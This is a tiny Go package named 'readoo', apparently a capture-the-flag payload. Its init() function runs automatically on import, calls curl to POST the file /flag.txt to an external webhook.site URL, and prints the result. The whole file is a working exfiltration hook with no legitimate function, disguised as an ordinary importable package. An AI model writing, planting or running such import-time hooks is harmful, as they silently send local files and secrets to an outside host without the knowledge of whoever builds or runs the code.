package readoo

import (
    "fmt"
    "os/exec"
)

func init() {
    webhook := "https://webhook.site/b79adad1-6f70-4531-8246-74cd33eb9078"

    cmd := exec.Command("curl", "-X", "POST", "-d", "@/flag.txt", webhook)

    out, err := cmd.CombinedOutput()
    if err != nil {
        fmt.Println("error running curl:", err)
    }
    fmt.Println(string(out))
}
